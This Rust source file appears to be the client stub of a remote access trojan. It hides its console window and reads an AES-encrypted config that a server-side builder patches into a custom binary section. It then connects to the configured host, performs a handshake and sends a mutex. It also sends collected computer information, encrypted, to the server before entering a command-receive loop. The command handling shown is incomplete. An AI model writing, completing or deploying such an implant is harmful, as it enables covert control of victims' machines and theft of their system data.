#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
///////////////////////////////////////////////////////////////////
// server patches config into this area
#[used]
#[unsafe(no_mangle)]
#[unsafe(link_section = ".rscdt")]
pub static _CONFIG_DATA: [u8; 4096] = [0xAA; 4096];
///////////////////////////////////////////////////////////////////

use aes_gcm::aead::consts::U32;
use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use shared::commands::{BaseCommand, BaseResponse, Command};
use shared::crypto::Encryption;
use shared::types::ClientConfig;
use smol::{
    //Executor,
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
};
use std::mem::size_of;

use crate::commands::computer_info;

mod commands;

/////////////////////////
fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    unsafe {
        std::ptr::read_volatile(_CONFIG_DATA.as_ptr()); // reads from _CONFIG_DATA

        // Now read the length
        let length_ptr = _CONFIG_DATA.as_ptr() as *const u32;
        let length = std::ptr::read_volatile(length_ptr).to_le() as usize;

        if length == 0 || length > 4092 {
            let _ = winsafe::HWND::GetDesktopWindow().MessageBox("Config has not been patched in yet!\nPlease build stubs with the Builder in the Server.", "", winsafe::co::MB::OK | winsafe::co::MB::ICONERROR);
            return Err("Config has not been patched into client, or is corrupt!".into());
        }
        //////////////////////////////////////////////////

        // STAGE 2: TRY TO READ THE CONFIG
        let config_start = _CONFIG_DATA.as_ptr().add(4);
        let mut config_trimmed = vec![0u8; length];
        for i in 0..length {
            config_trimmed[i] = std::ptr::read_volatile(config_start.add(i));
        }

        Ok(config_trimmed)
    }
}
fn decrypt(
    config_trimmed: &Vec<u8>,
) -> Result<(ClientConfig, &GenericArray<u8, U32>), Box<dyn std::error::Error>> {
    let key: &GenericArray<u8, U32> = Key::<Aes256Gcm>::from_slice(&config_trimmed[0..32]);
    let nonce = Nonce::from_slice(&config_trimmed[32..44]);
    let ciphertext = &config_trimmed[44..];

    let cipher = Aes256Gcm::new(key);
    let config = cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| e.to_string())
        .unwrap();
    //let config_string = String::from_utf8(config)?;

    let (client_config, _length): (ClientConfig, usize) =
        bincode::decode_from_slice(&config, bincode::config::standard())?;

    //println!("[✓] Decrypted config:\n    {}", &config_string);
    Ok((client_config, key))
}
/////////////////////////
fn main() -> Result<(), Box<dyn std::error::Error>> {
    let config_buffer = config()?;
    let (config, _key) = decrypt(&config_buffer)?;
    let socket = format!("{0}:{1}", &config.address, &config.port);

    smol::block_on(async move {
        // let executor = Executor::new(); // create an executor to spawn tasks
        // like so: executor.spawn(async {});
        let mut stream = TcpStream::connect(socket).await?;

        println!("[*] sending handshake");
        stream.write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32]).await?;
        println!("[v] sent handshake");

        println!("[*] waiting for response");
        let mut response = [0; 5];
        stream.read_exact(&mut response).await?;
        println!("[v] received response");

        if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] {
            println!("[v] handshake successful");
            stream.write_all(config.mutex.as_slice()).await?;
            println!("[*] sent mutex, awaiting response...");
        } else {
            println!("[x] handshake failed");
            return Err("Failed handshake with server".into()); // drop out
        }

        // send a payload here
        /*let payload = b"hello world";
        let payload_size = payload.len().to_le_bytes();
        println!("[*] sending payload size of {}", payload.len());
        stream.write_all(&payload_size).await?;
        println!("[*] sending payload!");
        stream.write_all(payload).await?;*/

        let encryption = Encryption::new(_key);

        // send computer info before anything happen
        if let Ok(res) = computer_info::main().await {
            let computer_info_payload = BaseResponse {
                id: 0,
                success: true,
                response: res,
            };
            let _ = send(
                &mut stream,
                &encryption,
                bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(),
            );
        }

        match wait(stream, encryption).await {
            Ok(_) => {
                println!("loop exited gracefully");
            }
            Err(e) => {
                println!("[x] error waiting for response: {}", e);
                // return Err(e);
            }
        }; // nice little command loop

        println!("[v] closing");
        Ok(())
    })
}

async fn send(stream: &mut TcpStream, encryption: &Encryption, buf: Vec<u8>) {
    if let Ok((nonce, encrypted)) = encryption.encrypt(&buf) {
        let mut payload = Vec::new();
        payload.extend_from_slice(&nonce);
        payload.extend_from_slice(&encrypted);

        let _ = shared::net::write(stream, &payload).await;
    } else {
        println!("[x] failed to write to client");
    }
}

async fn wait(mut stream: TcpStream, encryption: Encryption) -> Result<(), std::io::Error> {
    println!("[*][wait()] entered loop");

    loop {
        match shared::net::read(&mut stream).await {
            Ok(buf) => {
                println!("[*] got sum shit from the server");

                let mut nonce = [0u8; 12];
                nonce.copy_from_slice(&buf[..12]);
                let buffer = &buf[12..];
                if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) {
                    println!("decrypted: {}", String::from_utf8_lossy(&decrypted));
                } else {
                    println!("decryption failed!! wtf");
                }
            }
            Err(e) => {
                println!("[x] {}", e);
                break Ok(());
            }
        };
    }
}
